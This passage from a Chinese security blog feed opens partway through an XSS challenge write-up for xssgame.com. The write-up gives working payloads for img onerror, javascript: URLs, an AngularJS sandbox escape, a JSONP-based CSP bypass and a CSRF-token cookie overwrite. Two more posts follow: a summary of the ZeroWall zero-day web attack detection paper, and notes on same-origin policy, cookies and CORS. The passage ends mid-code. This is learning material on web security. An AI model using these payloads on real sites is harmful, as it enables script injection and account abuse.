class="keyword">var</span> i = <span class="number">0</span>; i &lt; tabs.<span class="property">length</span>; i++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (tabs[i].<span class="property">id</span> == <span class="string">&quot;tab&quot;</span> + <span class="built_in">parseInt</span>(name)) &#123;</span><br><span class="line">            tabs[i].<span class="property">className</span> = <span class="string">&quot;tab active&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tabs[i].<span class="property">className</span> = <span class="string">&quot;tab&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span> = name;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Tell parent we&#x27;ve changed the tab</span></span><br><span class="line">        top.<span class="title function_">postMessage</span>(&#123;<span class="string">&#x27;url&#x27;</span>: self.<span class="property">location</span>.<span class="title function_">toString</span>()&#125;, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>看到了有用到img标签，前面总结的载荷中就写到了，图片显示错误的话会自动触发onerror，<code>&lt;img src=x ononerrorerror=alert(1) /&gt;</code>，构造payload<code>/#1&#39; onerror=&#39;alert(11)&#39;</code>，来到下一关</p><p>第四关，看到没有任何回显，在几个页面间跳转，F12查看页面源代码，发现了一行这样的代码<code>setTimeout(function() &#123; window.location = &#39;welcome&#39;; &#125;, 1000);</code>，这里需要提到一个知识点：<code>window.location</code> 等同于 <code>window.location.href</code>，而href属性支持执行javascript也就是这样写：<code>href=&#39;javascript:alert()&#39;</code>，因此可以构造Payload：<code>next=javascript:alert()</code>，成功执行</p><p>第五关，用到了Angular框架，这个框架的特点是可以用<code>&#123;&#123;1+1&#125;&#125;</code>类似这样的方式执行代码，但是我尝试输入后，发现被html编码了，而且也没有什么地方可以执行，接下来审计代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      angular.<span class="title function_">module</span>(<span class="string">&#x27;myApp&#x27;</span>, [])</span><br><span class="line">      .<span class="title function_">controller</span>(<span class="string">&#x27;myController&#x27;</span>, [<span class="string">&#x27;$scope&#x27;</span>, <span class="keyword">function</span> (<span class="params">$scope</span>) &#123;</span><br><span class="line">        $scope.<span class="property">query</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        $scope.<span class="property">alert</span> = <span class="variable language_">window</span>.<span class="property">alert</span>;</span><br><span class="line">      &#125;]);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> <span class="variable constant_">UTM_PARAMS</span> = [<span class="string">&quot;utm_content&quot;</span>, <span class="string">&quot;utm_medium&quot;</span>, <span class="string">&quot;utm_source&quot;</span>,</span><br><span class="line">          <span class="string">&quot;utm_campaign&quot;</span>, <span class="string">&quot;utm_term&quot;</span>]</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (location.<span class="property">search</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">var</span> params = location.<span class="property">search</span>.<span class="title function_">substring</span>(<span class="number">1</span>).<span class="title function_">split</span>(<span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">in</span> params) &#123;</span><br><span class="line">          <span class="keyword">var</span> r = params[p].<span class="title function_">split</span>(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (r.<span class="property">length</span> == <span class="number">2</span> &amp;&amp; <span class="variable constant_">UTM_PARAMS</span>.<span class="title function_">indexOf</span>(r[<span class="number">0</span>]) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> el = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(r[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (el.<span class="property">length</span>) el[<span class="number">0</span>].<span class="property">value</span> = <span class="built_in">decodeURIComponent</span>(r[<span class="number">1</span>]);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上面代码涉及到UTM解析：UTM参数是在线营销和网站分析中的一个重要工具，它们是一组查询参数，可以附加到URL中，用于追踪和分析营销活动的效果。UTM代表Urchin Tracking Module。<code>location.search</code>是对URL的查询字符串，<code>split(&#39;&amp;&#39;)</code>是把字符串分割成数组，<code>split(&#39;=&#39;)</code>是把数组分割成键值对，<code>decodeURIComponent(r[1])</code>是把编码后的字符串解码，并赋值给el[0]。也就是对参数中的代码作了执行，替换到UTM_PARAMS中某个节点处，则构造payload：<code>?utm_term=&#123;&#123;alert()&#125;&#125;</code>，成功。</p><p>第六关，发现和前面的类似，但都尝试了下不行，其实刚才我遇到Angular后第一反应是去搜有没有相应的框架漏洞，这次又检索了下，发现有一个漏洞，满足源代码中引用的版本：1.2.0<br>下面的博客中给出了相应的payload<br><a href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs">https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs</a><br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image-2.png"><br>尝试输入，构造参数<code>?query=&#123;&#123;a='constructor';b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()&#125;&#125;</code>，直接放在url中没有反应，看了解析说用<code>&amp;lcub;</code>是{的字符实体，<code>&amp;rcub;</code>是}的字符实体。使用这些实体替代原字符可以实现注入。</p><p>第七关，这关打开后看到熟悉的CSP，CSP是Content Security Policy的缩写，前两天刚看了。审计代码发现有个关键的level7.js文件，其中内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> m = location.<span class="property">search</span>.<span class="title function_">match</span>(<span class="string">&#x27;menu=(.*)&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> menu = m ? <span class="title function_">atob</span>(m[<span class="number">1</span>]) : <span class="string">&#x27;about&#x27;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;script src=&quot;jsonp?menu=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(menu) + <span class="string">&#x27;&quot;&gt;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Display stuff returned from server side.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">string</span>&#125; <span class="variable">data</span> - JSON data from server side</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data.<span class="property">title</span>) <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;h1&gt;&#x27;</span> + data.<span class="property">title</span> + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (data.<span class="property">pictures</span>) data.<span class="property">pictures</span>.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">url</span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;/static/img/&#x27;</span> + url + <span class="string">&#x27;&quot;&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><p>在其中看到了熟悉的jsonp，jsonp可能会错误接收callback 参数，构造payload：<code>jsonp?callback=1</code>，有正常回显<br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image-3.png"><br>接下来想办法插入执行代码，观察url参数是被base64编码后的，随便输入一些尝试下，可以显示在页面，编码后传入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>（<code>PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==</code>），发现没有正常显示。观察控制台输出：<br><img src="/2024/09/20/WebSecurity/owasptop/crosssitescripting/image-4.png"><br>因为同源策略被禁止代码执行，这个时候就想到上面的jsonp，利用jsonp执行代码，构造payload <code>&lt;script src=&#39;jsonp?callback=alert();//&#39;&gt;&lt;/script&gt;</code>，编码后：<code>PHNjcmlwdCBzcmM9J2pzb25wP2NhbGxiYWNrPWFsZXJ0KCk7Ly8nPjwvc2NyaXB0Pg==</code>，最终成功执行。</p><p>第8关，先走了下流程，大概就是可以set自己的名字，然后可以给别人转账，那么我们的思路就是，给出一个链接，可以set的同时还可以直接转账，首先看下set的内容：<br><code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=name&amp;value=12345&amp;redirect=index</code><br>返回包中<code>Set-Cookie: name=12345; Path=/</code> 和我们设定的一致，看下转钱的包，请求如下：<br><code>http://www.xssgame.com/f/d9u16LTxchEi/transfer?name=31123&amp;amount=123&amp;csrf_token=99DPV595WL</code><br>我们先验证下set，构造payload<code>http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&amp;value=12345&amp;redirect=index</code>，发现成功set，因为这里的set之后直接就有跳转，那我们直接构造一个转账页面跳转过去执行，因为<code>&amp;</code>会被url解析为参数，所以这里用url编码下<br><code>transfer%3Fname%3D31123%26amount%3D123%26csrf_token%3D12345</code>，直接在控制台执行<code>encodeURIComponent(&#39;transfer?name=31123&amp;amount=123&amp;csrf_token=12345&#39;)</code>即可，到这里是能干坏事了，但还是没有正常执行，发现转账数目错误的情况下会有回显，构造payload如下：<code>transfer?name=31123&amp;amount=%3Cscript%3Ealert()%3C/script%3E&amp;csrf_token=12345</code>。</p><h2 id="防范XSS"><a href="#防范XSS" class="headerlink" title="防范XSS"></a>防范XSS</h2><p><a href="https://segmentfault.com/a/1190000022678120">https://segmentfault.com/a/1190000022678120</a><br><a href="https://www.cnblogs.com/blbl-blog/p/17188558.html">https://www.cnblogs.com/blbl-blog/p/17188558.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【论文精读】ZeroWall Detecting Zero-Day Web Attacks through Encoder-Decoder Recurrent Neural Networks</title>
      <link href="/2024/09/20/PaperReading/ZeroWall/"/>
      <url>/2024/09/20/PaperReading/ZeroWall/</url>
      
        <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>这篇论文是针对0day攻击的检测，主要方法是利用编码器解码器神经网络，编码器解码器可以将payload编码之后再还原，那么拿很多正常数据报训练之后，还原输出的结果，如果还原的结果和正常数据报相似度高，那么就是正常数据报，否则就是异常数据报。</p><p>零日网络攻击是网络安全的最严重威胁之一，因为它们是未知的，所以很难被基于签名的网络应用防火墙（WAF）检测到。文章提出了一种名为ZeroWall的无监督方法，该方法可以与现有的WAF协同工作，有效地检测零日网络攻击。ZeroWall使用历史网络请求（大多数是良性的）来训练一个自编码翻译机器，以捕捉良性请求的语法和语义模式。在实时检测中，如果WAF未能检测到的零日攻击请求不能被自编码翻译机器很好地理解，并且不能被机器翻译回原始请求，则被声明为攻击。在对8个真实世界的数据集（包含14亿个网络请求）的评估中，ZeroWall成功地检测到了WAF漏掉的真实零日攻击，并且取得了超过0.98的高F1分数，显著优于所有基线方法。</p><h2 id="Related-Work"><a href="#Related-Work" class="headerlink" title="Related Work"></a>Related Work</h2><p>基于异常的web攻击检测方法可以分为以下三种：</p><ul><li>点异常检测：这类方法侧重于单个数据包的异常。ZeroWall也属于这一类，它侧重于利用单个HTTP请求中的语法和语义。一种简单的方法是将HTTP请求“句子”分割成单词，恶意请求中使用的单词集合与良性请求中的单词集合可能存在差异，这些差异可以作为检测攻击的指标。</li><li>基于上下文的上下文异常检测：这类方法利用请求之间的上下文信息。然而，对于零日Web攻击检测来说，这些方法通常不太有效，因为零日攻击数据包在上下文中和统计数据中通常不会被反映出来。</li><li>基于统计的集体异常检测：这些方法依赖于大量数据的集体和统计信息，但在检测零日Web攻击方面不太有效，因为零日Web攻击在大量Web请求中非常罕见。</li></ul><p>而基于点异常的检测，又有着以下一些具体的解决方案：</p><ul><li>基于HMM的方法：例如，Spectrogram是一个基于隐马尔可夫模型（HMM）的方法，用于重建内容流并从数据包中提取特征。Hmmpayl是一个基于HMM的入侵检测系统，用于从有效载荷中检测攻击。然而，HMM模型在处理复杂请求时表现不佳，因为序列长度不适合时会导致性能下降。</li><li>基于深度学习的方法：提出了基于深度学习的方法来学习复杂的HTTP请求日志。这些方法包括使用神经网络优化反向传播用于入侵检测系统，以及提出多种针对不同类型攻击的深度学习方法。还有基于卷积神经网络（CNN）模型来训练请求中的单词。</li><li>无监督方法：例如，使用n-gram和堆叠自动编码器的无监督方法来学习HTTP请求。然而，这种方法直接使用编码器输出（降维）结果进行异常检测，这可能导致异常样本的输出与正常样本无法区分，从而限制了性能。</li></ul><h2 id="Core-Idea"><a href="#Core-Idea" class="headerlink" title="Core Idea"></a>Core Idea</h2><p><img src="/2024/09/20/PaperReading/ZeroWall/image.png"><br>在这篇论文的”核心思想和系统概述（CORE IDEA AND SYSTEM OVERVIEW）”部分，作者详细介绍了ZeroWall的设计目标、核心思想和整体架构。这一部分内容可以分为以下几个关键点：</p><h3 id="设计目标"><a href="#设计目标" class="headerlink" title="设计目标"></a>设计目标</h3><ol><li><strong>与现有WAF协同工作</strong>：ZeroWall旨在作为现有基于签名的Web应用防火墙（WAF）的补充，而不是完全取代它们。这种设计允许ZeroWall在不增加额外开销的情况下，与WAF一起部署，共同提高Web安全。</li><li><strong>检测单个HTTP请求中的零日Web攻击</strong>：ZeroWall选择使用无监督方法，因为它不需要事先知道攻击的确切模式，因此比有监督方法更有潜力检测到零日攻击。</li></ol><h3 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h3><ol><li><strong>基于异常检测的无监督方法</strong>：ZeroWall的训练数据来自于WAF允许的历史Web请求，这些请求大多数被认为是良性的。作者使用编码器-解码器循环神经网络作为基础训练算法，这些网络在训练足够的句子后能够“理解”这种语言，从而可以将输入句子翻译成潜在的表示，然后再翻译回原语言。</li><li><strong>将零日Web攻击检测问题转化为机器翻译质量评估问题</strong>：ZeroWall的核心观察是，HTTP请求遵循HTTP协议，可以被视为“HTTP请求语言”中的一句话。通过训练，网络能够将良性输入Web请求“翻译”成潜在表示，然后“翻译”回接近原始请求的输出Web请求。如果翻译质量高，请求则被认为是良性的；否则，被认为是攻击。</li></ol><h3 id="系统概述"><a href="#系统概述" class="headerlink" title="系统概述"></a>系统概述</h3><ol><li><strong>离线定期重新训练</strong>：定期（例如，每天）或手动触发离线训练，以利用最新WAF规则过滤的最新请求数据。这个过程包括构建词汇表、将HTTP请求日志转换为令牌序列，并训练编码器-解码器神经网络。</li><li><strong>在线检测</strong>：在线检测阶段，ZeroWall实时检测HTTP请求是否为良性或恶意（即零日攻击）。这个阶段包括令牌解析器、编码器-解码器网络、异常检测和手动调查等组件。给定一个HTTP请求作为输入，ZeroWall首先使用离线构建的词汇表将请求转换为令牌序列，然后编码器-解码器网络重建恢复的令牌序列。异常检测组件通过计算原始和恢复令牌序列之间的BLEU分数来决定请求是良性还是恶意的。</li><li><strong>手动调查</strong>：为了处理无监督异常检测可能产生的误报，被标记为“恶意”的请求将由安全工程师手动调查。确认的误报将被加入白名单，以避免未来因相同模式的请求而产生的误报。确认的真实零日攻击将用于更新WAF规则。</li></ol><h2 id="DESIGN-DETAILS"><a href="#DESIGN-DETAILS" class="headerlink" title="DESIGN DETAILS"></a>DESIGN DETAILS</h2><h3 id="A-Token-Parser（令牌解析器）"><a href="#A-Token-Parser（令牌解析器）" class="headerlink" title="A. Token Parser（令牌解析器）"></a>A. Token Parser（令牌解析器）</h3><p>Token Parser负责将HTTP请求字符串转换为令牌序列。这个过程包括三个主要步骤：</p><ol><li><strong>构建词汇表（Vocabulary）</strong>：首先，系统通过分隔符（如标点和空格）将请求字符串分割成多个“单词”。然后，过滤掉无用的词（如变量和停用词），并使用词嵌入技术来表示这些词。词汇表中的每个词都与一个唯一的标记ID关联。</li><li><strong>生成令牌序列（Token Sequence）</strong>：一旦词汇表构建完成，系统就可以将请求转换为令牌序列。这个过程通过保留词汇表中的词并过滤掉其他词来完成。例如，变量和停用词被替换为占位符。</li><li><strong>令牌嵌入（Token Embedding）</strong>：每个令牌由其在词汇表中的ID表示，这可能会忽略令牌的含义。因此，系统添加了一个嵌入层，将这些标记ID映射到潜在的向量空间中，使用向量之间的距离来表示它们之间的逻辑关系。</li></ol><h3 id="B-Encoder-Decoder-Network（编码器-解码器网络）"><a href="#B-Encoder-Decoder-Network（编码器-解码器网络）" class="headerlink" title="B. Encoder-Decoder Network（编码器-解码器网络）"></a>B. Encoder-Decoder Network（编码器-解码器网络）</h3><p>编码器-解码器网络的核心功能是将一个序列映射到另一个序列。在ZeroWall中，输入是原始令牌序列，输出是网络学习后重建的令牌序列。</p><ol><li><strong>编码器（Encoder）</strong>：编码器是一个LSTM（长短期记忆）网络，它读取令牌序列并构建一个固定维度的向量来表示原始序列。</li><li><strong>解码器（Decoder）</strong>：解码器是另一个LSTM网络，它使用编码器的表示来计算输出序列的概率。解码器的输出是一个概率向量，每个元素代表词汇表中某个标记的概率。解码器选择概率最高的标记作为输出。</li><li><strong>重建（Reconstruction）</strong>：网络试图使用相同的词汇表中的标记重建原始令牌序列，这代表了相同的信息。重建的序列与原始序列之间的差异用于后续的异常检测。</li></ol><h3 id="C-Anomaly-Detection（异常检测）"><a href="#C-Anomaly-Detection（异常检测）" class="headerlink" title="C. Anomaly Detection（异常检测）"></a>C. Anomaly Detection（异常检测）</h3><p>异常检测的核心思想是，编码器-解码器网络能够更准确地重建良性令牌序列。对于零日Web攻击请求，网络输出将与输入大相径庭。为了进行异常检测，系统比较原始令牌序列和恢复令牌序列之间的相似性，并将其用作异常指标。</p><ol><li><strong>使用BLEU指标</strong>：BLEU（Bilingual Evaluation Understudy）指标用于计算两个序列之间的相似度。BLEU值范围从0到1，值越高表示源序列和目标序列之间的相似度越高。</li><li><strong>恶意分数（Malicious Score）</strong>：为了检测异常，系统定义了恶意分数（1 - BLEU）作为估计器。较高的恶意分数意味着网络无法重建给定序列，表明输入序列可能是恶意的。</li><li><strong>阈值判断</strong>：恶意分数与特定阈值进行比较，以确定请求是良性还是恶意的。<br><img src="/2024/09/20/PaperReading/ZeroWall/image-1.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文精读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【web安全】浏览器同源策略和跨域问题</title>
      <link href="/2024/09/20/WebSecurity/owasptop/browserorigin/"/>
      <url>/2024/09/20/WebSecurity/owasptop/browserorigin/</url>
      
        <content type="html"><![CDATA[<p>写这篇笔记的想法是之前看白帽子讲web安全的时候，就看到有关浏览器对域采取的一系列安全措施，如：同源策略等，后面为了方便web应用有在数据包header中添加字段，但也带来了很多风险。<br>在这一背景下想要系统整理一下相关的知识<br>参考博客：<a href="https://www.freebuf.com/articles/web/208672.html">https://www.freebuf.com/articles/web/208672.html</a><br><a href="https://blog.csdn.net/jined/article/details/120693745">https://blog.csdn.net/jined/article/details/120693745</a></p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>找到2017年的一篇论文：Same-Origin Policy: Evaluation in Modern Browsers，发在顶会上的</p><p>个人理解的域和源本质上是一样的，只是域是针对单个的，而有源就要有汇，是针对双方的。在浏览器的上下文中，域（Domain） 是一种安全模型的基础构件，主要用来确定哪些网络资源（如网页、图片、脚本等）可以与哪些其他资源互相交互。而域的概念是为了实现 Web 安全而设计的，主要目的是防止恶意网站访问或操作其他网站的数据，这种安全策略被称为同源政策（Same-Origin Policy, SOP）（是由 Netscape 提出的一个著名的安全策略，现在所有支持 JavaScript 的浏览器都会使用这个策略。）</p><p><img src="/2024/09/20/WebSecurity/owasptop/browserorigin/image.png"></p><p>浏览器的同源策略：对于Web页面上的脚本来说，只能访问来自同一来源的数据，而不能访问或修改不同来源的数据。这里的“来源”（origin）是由协议（protocol）、域名（domain）和端口（port）三个部分组成的。只有当这三者完全相同的时候，两个资源才被认为是“同源”的。<br>虽然浏览器为了安全目的引入了同源政策，但同时也给开发者们带来很多问题，这也催生出了很多的跨域手段，带来了新的攻击面。</p><p>①.<a href="https://blog.csdn.net/bestxianfeng163/article/details/105666140">浏览器</a>先根据同源策略对前端页面和后台交互地址做匹配，若同源，则直接发送数据请求；若不同源，则发送跨域请求。<br>②.服务器解析程序收到浏览器跨域请求后，根据自身配置返回对应文件头。若未配置过任何允许跨域，则文件头里不包含Access-Control-Allow-origin字段，若配置过域名，则返回Access-Control-Allow-origin+ 对应配置规则里的域名的方式。<br>③.浏览器根据接受到的http文件头里的Access-Control-Allow-origin字段做匹配，若无该字段，说明不允许跨域；若有该字段，则对字段内容和当前域名做比对，如果同源，则说明可以跨域，浏览器发送该请求；若不同源，则说明该域名不可跨域，不发送请求</p><h2 id="Cookie的跨域问题"><a href="#Cookie的跨域问题" class="headerlink" title="Cookie的跨域问题"></a>Cookie的跨域问题</h2><p>在Cookie设置中有很多<a href="https://blog.csdn.net/qq_51383106/article/details/131458419">属性</a></p><table><thead><tr><th>名称</th><th>Cookie的name</th></tr></thead><tbody><tr><td>值</td><td>Cookie的value</td></tr><tr><td>Domain</td><td>Cookie的域。如果设成 xxx.com(一级域名)，那么子域名x.xxx.com(二级域名)，都可以使用xxx.com的Cookie</td></tr><tr><td>Path</td><td>Cookie的路径。如果设为&#x2F;，则同域名全部路径均可使用该Cookie。如果设为&#x2F;xxx&#x2F;，则只有路径为&#x2F;xxx&#x2F;可以使用该Cookie。</td></tr><tr><td>Expires &#x2F; Max-Age</td><td>Cookie的超时时间。如果值为时间，则在到达指定时间后Cookie失效。如果值为Session(会话)，Cookie会同Session一起失效，当整个浏览器关闭的时候Cookie失效。</td></tr><tr><td>Size</td><td>Cookie的大小。</td></tr><tr><td>HttpOnly</td><td>值为true时，Cookie只会在Http请求头中存在，不能通过doucment.cookie(JavaScript)访问Cookie。</td></tr><tr><td>Secure</td><td>值为true时，只能通过https来传输Cookie。</td></tr><tr><td>SameSite</td><td>值为Strict，完全禁止第三方Cookie，跨站时无法使用Cookie。值为Lax，允许在跨站时使用Get请求携带Cookie，下面有一个表格介绍Lax的Cookie使用情况。值为None，允许跨站跨域使用Cookie，前提是将Secure属性设置为true。Priority ：Cookie的优先级。值为Low&#x2F;Medium&#x2F;High，当Cookie数量超出时，低优先级的Cookie会被优先清除。</td></tr></tbody></table><p>针对上面的属性，如果设置不当，就有可能存在安全问题：<br>上面的Cookie配置中涉及到安全性的属性主要包括Domain、Path、HttpOnly、Secure和SameSite。每个属性的设置都会直接影响到Cookie的安全性和应用的安全风险。下面分别分析这些属性可能引起的安全问题：</p><ol><li>Domain（域）：如果Domain设置不当，比如设置为一级域名（例如<code>xxx.com</code>），那么所有xxx.com的子域（如<code>sub.xxx.com</code>）都可以访问这个Cookie。这可能会导致Cookie被不安全的子域访问，增加数据泄露的风险。依据最小特权原则，尽量将cookie作用域设置的越小越好。</li><li>Path（路径）：如果Path设置为根路径（<code>/</code>），则整个网站的所有页面都能访问这个Cookie。如果某些路径下的页面存在安全漏洞，那么这些页面也能访问到Cookie，存在被利用的风险。</li><li>HttpOnly：如果HttpOnly属性未被设置（即默认情况下或设置为false），Cookie可以通过客户端脚本，如JavaScript的<code>document.cookie</code>访问。</li><li>Secure：如果Secure属性未设置，Cookie可以通过不安全的HTTP连接传输。</li><li>SameSite</li></ol><ul><li><strong>Strict</strong>：严格的设置可能会导致合法的跨站请求场景（例如，用户从其他网站点击链接跳转到站点时）下Cookie不被发送，影响用户体验。</li><li><strong>Lax</strong>：相对宽松，但在某些情况下（如POST请求等）仍不发送Cookie，可能影响功能的实现。</li><li><strong>None</strong>：如果没有正确设置Secure属性，设置SameSite为None时可能导致Cookie在跨站请求中被发送，增加CSRF攻击的风险。</li></ul><p><a href="https://blog.csdn.net/dingtao_237/article/details/103007697">子父域问题</a>：子域可以获取到父域的cookie，反之则不行。所以我们在种全站cookie的时候（比如登录状态），都会种到全站域名的父域上，这样全站可以共享登录状态。当然这里说的全站域名都是一个父域的情况。</p><h2 id="CORS（跨源资源共享）"><a href="#CORS（跨源资源共享）" class="headerlink" title="CORS（跨源资源共享）"></a>CORS（跨源资源共享）</h2><p>CORS 全称 Cross-Origin Resource Sharing, 跨域资源共享，是 HTML5 的一个新特性，已被所有浏览器支持，跨域资源共享(CORS)是一种放宽同源策略的机制，它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制，以使不同的网站可以跨域获取数据。</p><p>CORS（Cross-Origin Resource Sharing，跨源资源共享）是一个允许在网页脚本中访问不同源服务器资源的安全功能。它是一个 W3C 标准，旨在克服浏览器同源政策对资源跨域访问的限制。</p><h3 id="CORS-的工作原理"><a href="#CORS-的工作原理" class="headerlink" title="CORS 的工作原理"></a>CORS 的工作原理</h3><p><img src="/2024/09/20/WebSecurity/owasptop/browserorigin/image-1.png"><br>CORS 通过添加一系列新的 HTTP 头部来扩展已有的 HTTP 协议，使得服务器能够声明哪些源站可以访问该服务器上的资源。在 CORS 中，HTTP 请求由两种类型：</p><ol><li><p><strong>简单请求（Simple Requests）</strong>：</p><ul><li>使用 GET、HEAD 或 POST 方法。</li><li>POST 方法的 <code>Content-Type</code> 仅限于 <code>text/plain</code>、<code>multipart/form-data</code> 和 <code>application/x-www-form-urlencoded</code>。</li><li>不会改变服务器状态的请求被视为简单请求。</li></ul><p>简单请求的 CORS 流程：</p><ul><li>浏览器在简单请求的头部中自动添加 <code>Origin</code> 字段，这个字段标明请求来自哪个源（协议+域名+端口）。</li><li>服务器根据这个源决定是否允许请求。如果允许，服务器会在响应头中添加 <code>Access-Control-Allow-Origin</code>。浏览器只有在收到这个头部，并且值与请求的源相匹配，或者是通配符 <code>*</code> 时，才会处理响应。如果不允许，服务器不会添加该字段，浏览器也会阻止应用访问该响应。</li></ul></li><li><p><strong>预检请求（Preflight Requests）</strong>：</p><ul><li>使用了除 GET、HEAD、POST 之外的 HTTP 方法。</li><li>发送了除简单请求头之外的自定义头，如 <code>application/json</code>。</li><li>对服务器有特定影响的 POST 请求（如发送 JSON 或 XML 数据）。</li></ul><p>预检请求的 CORS 流程：</p><ul><li>在发送实际请求前，浏览器首先会发送一个 OPTIONS 请求到服务器，询问服务器是否允许跨域请求。</li><li>这个 OPTIONS 预检请求包括以下头信息：<code>Origin</code>、<code>Access-Control-Request-Method</code>（实际请求中将使用的 HTTP 方法）和 <code>Access-Control-Request-Headers</code>（实际请求中将设置的自定义头信息）。</li><li>如果服务器允许，它会在响应中包括如 <code>Access-Control-Allow-Methods</code>、<code>Access-Control-Allow-Headers</code>、<code>Access-Control-Allow-Origin</code> 等头部，明确允许的方法、头部和源。</li><li>浏览器接收到允许的响应后，会发送实际的 HTTP 请求。</li></ul></li></ol><h3 id="CORS-响应头部"><a href="#CORS-响应头部" class="headerlink" title="CORS 响应头部"></a>CORS 响应头部</h3><ul><li>**<code>Access-Control-Allow-Origin</code>**：指定哪些域可以访问域资源。例如，如果requester.com 想要访问 provider.com 的资源，那么开发人员可以使用此标头安全地授予 requester.com 对 provider.com 资源的访问权限。</li><li>**<code>Access-Control-Allow-Methods</code>**：指定可以使用哪些 HTTP 请求方法（GET，PUT，DELETE 等）来访问资源。此标头允许开发人员通过在 requester.com 请求访问provider.com 的资源时，指定哪些方法有效来进一步增强安全性。</li><li>**<code>Access-Control-Allow-Headers</code>**：允许的 HTTP 请求头。</li><li>**<code>Access-Control-Allow-Credentials</code>**：指定浏览器是否将使用请求发送 cookie。仅当 allow-credentials 标头设置为 true 时，才会发送 Cookie。</li></ul><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS">使用场景</a></h3><p>CORS 非常适用于单页应用（SPA），这些应用通常会从多个源加载资源。CORS 也是实现 API 服务和前端分离的关键技术之一，使得前端应用可以安全地从不同源获取数据和资源。<br>SpringCloud设置跨域</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 